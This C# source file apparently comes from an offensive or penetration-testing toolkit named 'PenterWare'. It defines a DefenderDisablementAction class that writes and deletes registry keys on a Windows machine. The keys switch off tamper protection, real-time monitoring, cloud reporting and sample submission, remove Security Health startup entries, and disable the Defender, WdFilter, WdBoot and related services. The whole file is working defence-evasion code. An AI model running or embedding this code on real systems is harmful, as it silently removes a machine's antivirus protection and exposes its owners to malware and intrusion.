using System.Collections.Generic;
using System.Linq;

namespace PenterWare.Actions.OsCommands.RegistryManagement;

internal class DefenderDisablementAction : RegistryManagementAction
{
	private static string DEFENDER_POLICY = "HKLM\\Software\\Policies\\Microsoft\\Windows Defender";

	private static string MPENGINE = "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine";

	private static string RT_PROTECT = "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection";

	private static string SPYNET = "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet";

	private static string REPORTING = "HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\REPORTING";

	private static string SERVICE_PATH = "HKLM\\System\\CurrentControlSet\\Services";

	private static string Name = "DefenderRegistryDisablement";

	public override string ActionName => Name;

	protected override List<RegistryCommand> getRegistryCommands()
	{
		return new List<RegistryCommand>
		{
			new RegistryCommand("HKLM\\Software\\Microsoft\\Windows Defender\\Features", "TamperProtection", "REG_DWORD", "0", create: true),
			new RegistryCommand("HKLM\\System\\CurrentControlSet\\Services\\SgrmBroker", "Start", "REG_DWORD", "4", create: true),
			new RegistryCommand("HKLM\\System\\CurrentControlSet\\Services\\SecurityHealthService", "Start", "REG_DWORD", "4", create: true)
		}.Concat(generatePolicyAnullment()).Concat(generateDeletionComms()).Concat(generateServiceRelatedRegs())
			.ToList();
	}

	private List<RegistryCommand> generatePolicyAnullment()
	{
		return new List<RegistryCommand>
		{
			new RegistryCommand(DEFENDER_POLICY),
			new RegistryCommand(DEFENDER_POLICY, "DisableAntiSpyware", "REG_DWORD", "1", create: true),
			new RegistryCommand(DEFENDER_POLICY, "DisableAntiVirus", "REG_DWORD", "1", create: true),
			new RegistryCommand(MPENGINE, "MpEnablePus", "REG_DWORD", "0", create: true),
			new RegistryCommand(RT_PROTECT, "DisableBehaviorMonitoring", "REG_DWORD", "1", create: true),
			new RegistryCommand(RT_PROTECT, "DisableIOAVProtection", "REG_DWORD", "1", create: true),
			new RegistryCommand(RT_PROTECT, "DisableOnAccessProtection", "REG_DWORD", "1", create: true),
			new RegistryCommand(RT_PROTECT, "DisableRealtimeMonitoring", "REG_DWORD", "1", create: true),
			new RegistryCommand(RT_PROTECT, "DisableScanOnRealtimeEnable", "REG_DWORD", "1", create: true),
			new RegistryCommand(REPORTING, "DisableEnhancedNotifications", "REG_DWORD", "1", create: true),
			new RegistryCommand(SPYNET, "DisableBlockAtFirstSeen", "REG_DWORD", "1", create: true),
			new RegistryCommand(SPYNET, "SpynetReporting", "REG_DWORD", "0", create: true),
			new RegistryCommand(SPYNET, "SubmitSamplesConsent", "REG_DWORD", "0", create: true)
		};
	}

	private List<RegistryCommand> generateDeletionComms()
	{
		return new List<RegistryCommand>
		{
			new RegistryCommand("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run", "SecurityHealth"),
			new RegistryCommand("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "SecurityHealth"),
			new RegistryCommand("HKCR\\*\\shellex\\ContextMenuHandlers\\EPP"),
			new RegistryCommand("HKCR\\Directory\\shellex\\ContextMenuHandlers\\EPP"),
			new RegistryCommand("HKCR\\Drive\\shellex\\ContextMenuHandlers\\EPP")
		};
	}

	private List<RegistryCommand> generateServiceRelatedRegs()
	{
		return new List<RegistryCommand>
		{
			new RegistryCommand(SERVICE_PATH + "\\WdBoot", "Start", "REG_DWORD", "4", create: true),
			new RegistryCommand(SERVICE_PATH + "\\WdFilter", "Start", "REG_DWORD", "4", create: true),
			new RegistryCommand(SERVICE_PATH + "\\WdNisDrv", "Start", "REG_DWORD", "4", create: true),
			new RegistryCommand(SERVICE_PATH + "\\WdNisSvc", "Start", "REG_DWORD", "4", create: true),
			new RegistryCommand(SERVICE_PATH + "\\WinDefend", "Start", "REG_DWORD", "4", create: true)
		};
	}
}
